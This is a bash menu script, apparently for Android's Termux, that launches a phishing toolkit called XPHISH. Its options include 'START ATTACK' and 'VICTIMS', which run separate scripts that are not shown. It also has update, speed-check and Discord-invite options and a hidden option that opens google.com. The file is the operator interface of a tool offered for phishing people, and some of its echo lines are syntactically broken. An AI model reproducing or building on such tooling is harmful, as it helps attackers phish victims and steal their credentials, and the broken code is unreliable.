clear
echo -e " \e[96m
                                 ████████ \e[0m"
echo "                             ████████████████
                               █─▄▀█──█▀▄─█
                              ▐▌──────────▐▌"
echo -e "\e[0m                              █▌\e[91m▀▄──▄▄──▄▀\e[0m▐█"
echo -e "\e[0m                             ▐██──\e[91m▀▀\e[91m──▀▀──\e[0m██" 
echo "                            ▄████▄──▐▌──▄████▄"
echo -e "\e[91m
                __   ________ _   _ _____ _____ _   _ 
                \ \ / /| ___ \ | | |_   _/  ___| | | |
                 \ V / | |_/ / |_| | | | \ `--.| |_| |
                 /   \ |  __/|  _  | | |  `--. \  _  |
                / /^\ \| |   | | | |_| |_/\__/ / | | |
echo -e "\e[96m               \/   \/\_|   \_| |_/\___/\____/\_| |_/e[0m"  
echo      
echo -e "                       \e[92m TOOL BY MRX (NITRO)\e[0m"
echo
echo -e "\e[96m        |-----------------------[V 1.3]-----------------------|"
echo -e "\e[96m        |-------------------\e[92mSELECT OPTIONS\e[96m--------------------|"
echo -e "\e[96m        |-----------------------------------------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |                [\e[92m1\e[96m]==> START ATTACK                  |"
echo -e "\e[96m        |                [\e[92m2\e[96m]==> VICTIMS                         |"
echo -e "\e[96m        |                [\e[92m3\e[96m]==> ABOUT                         |"
echo -e "\e[96m        |                [\e[92m4\e[96m]==> UPDATE                        |"
echo -e "\e[96m        |                [\e[92m5\e[96m]==> EXIT                          |"
echo -e "\e[96m        |                [\e[92m6\e[96m]==> DISCORD INVITE                     |"
echo -e "\e[96m        |                [\e[92m7\e[96m]==> CHECK SPEED                   |"                     |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |-----------------------------------------------------|"
echo -e "\e[96m        |---------------------\e[91mHEY BRO\e[96m----------------------|"
echo -e "\e[96m        |-----------------------------------------------------|"
read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] SELECT OPTION: \e[0m' option
if [[ $option == 1 || $option == 01 ]]; then
echo
cd $HOME/xphish/core
bash menu.sh
echo
elif [[ $option == 2 || $option == 02 ]]; then
echo
cd $HOME/xphish/core/
bash show.sh
elif [[ $option == 3 || $option == 03 ]]; then
echo
cd $HOME/xphish/core/about
bash about.sh
elif [[ $option == 4 || $option == 04 ]]; then
echo
cd $HOME/xphish/core/update
bash update.sh
echo
elif [[ $option == 5 ]]; then
clear
printf "                    \e[1;96m Have A Good Day ........! \e[0m\n"
echo
sleep 3.0
exit 3
elif [[ $option == 7 || $option == 07 ]]; then
echo
cd $HOME/xphish/core
bash intspeed.sh
elif [[ $option == 6 || $option == 06 ]]; then
echo
clear
am start -a android.intent.action.VIEW -d https://discord.gg/PyNycsa4Qn
clear
echo
elif [[ $option == 1934 || $option == 1934 ]]; then
echo
clear
am start -a android.intent.action.VIEW -d https://google.com
clear
echo                                                                                                                                                                                cd $HOME/xphish
bash x
else                                                                                                                                                                                 printf "                \e[1;92m [!] Invalid option!\e[0m\n"
sleep 1
cd $HOME/xphish
bash x
fi
